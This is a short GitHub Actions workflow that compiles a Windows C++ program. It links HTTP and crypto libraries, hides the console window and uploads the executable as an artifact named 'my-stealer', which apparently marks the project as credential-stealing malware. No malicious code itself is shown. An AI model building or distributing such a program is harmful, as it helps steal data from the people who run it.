name: Build EXE

on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: windows-latest
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
      
    - name: Compile
      run: cl /EHsc /MD /O2 main.cpp /link winhttp.lib crypt32.lib /SUBSYSTEM:WINDOWS
      
    - name: Upload Artifact
      uses: actions/upload-artifact@v3
      with:
        name: my-stealer
        path: main.exe
